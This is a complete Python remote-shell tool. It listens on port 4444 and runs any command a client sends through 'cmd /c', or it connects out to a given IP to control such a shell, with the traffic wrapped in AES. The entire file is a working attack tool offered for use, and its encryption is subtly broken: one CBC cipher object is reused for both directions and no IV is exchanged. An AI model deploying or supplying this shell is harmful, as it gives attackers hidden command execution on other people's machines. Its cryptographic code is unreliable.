import socket, subprocess, threading, argparse,os

from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

PORT=4444
MAX_BUFFER=4096

class AESCipher:
    def __init__(self, key):
        self.key = key if key else get_random_bytes(32)
        self.cipher = AES.new(self.key, AES.MODE_CBC)
    
    def encrypt(self, data):
        return self.cipher.encrypt(pad(data, AES.block_size))
    def decrypt(self, data):
        return unpad(self.cipher.decrypt(bytearray.fromhex(data)), AES.block_size)
    def __str__(self):
        return "Key -> {}".format(self.key.hex())



def encrypted_send(s,msg):
    s.send(cipher.encrypt(msg))

def execute_cmd(cmd):
    try:
        output = subprocess.check_output("cmd /c {}".format(cmd),stderr=subprocess.STDOUT, shell=True)

    except:
        output = b"Command failed"
    return output


def decode_and_strip(s):
    return s.decode("latin-1").strip()

def shell_thread(s):
    encrypted_send(s,b"[ -- Connected! --]")
    try:
        while True:
            encrypted_send(s,b"\r\nEnter Command> ")
            data = s.recv(MAX_BUFFER)
            if data:
                buffer = cipher.decrypt(decode_and_strip(data))
                buffer = decode_and_strip(buffer)
                if not buffer or buffer == "exit":
                    s.close()
                    exit()

            print("Executing command: {} ".format(buffer))
            encrypted_send(s,execute_cmd(buffer))
    except:
        s.close()
        exit()

def send_thread(s):
    try:
        while True:
            data = input() + "\n"
            if data:
                encrypted_send(s,data.encode("latin-1"))
    except:
        s.close()
        exit()

def receive_thread(s):
    try:
        while True:
            data = decode_and_strip(s.recv(MAX_BUFFER))
            if data:
                data = cipher.decrypt(data).decode("latin-1")
                print(data, end="",flush=True)

    except:
        s.close()
        exit()

def server(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, int(port)))
    s.listen()

    print("[-- Starting Bind Shell --]")
    while True:
        client, addr = s.accept()
        print("[ -- New User connected! -- ]".format(addr))
        threading.Thread(target=shell_thread, args=(client,)).start()

def client(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, int(port)))
    print("[-- Connecting Reverse Shell --]")
    threading.Thread(target=send_thread, args=(s,)).start()
    threading.Thread(target=receive_thread, args=(s,)).start()

parser = argparse.ArgumentParser(description="Simple Python Bind/Reverse Shell")
parser.add_argument("-l", "--listen",  help="Listen for incoming connections")
parser.add_argument("-p", "--port",  help="Port to use")
parser.add_argument("-c", "--connect", help="IP address to connect to")
parser.add_argument("-k", "--key", help="AES Key", required=False)
args = parser.parse_args()

if args.connect and not args.key:
    parser.error("-c CONNECT requires -k KEY.")

if args.key:
    cipher = AESCipher(bytearray.fromhex(args.key))
else:
    cipher = AESCipher(None)
print(cipher)

if args.listen:
    server(args.listen,args.port)
elif args.connect:
    client(args.connect,args.port)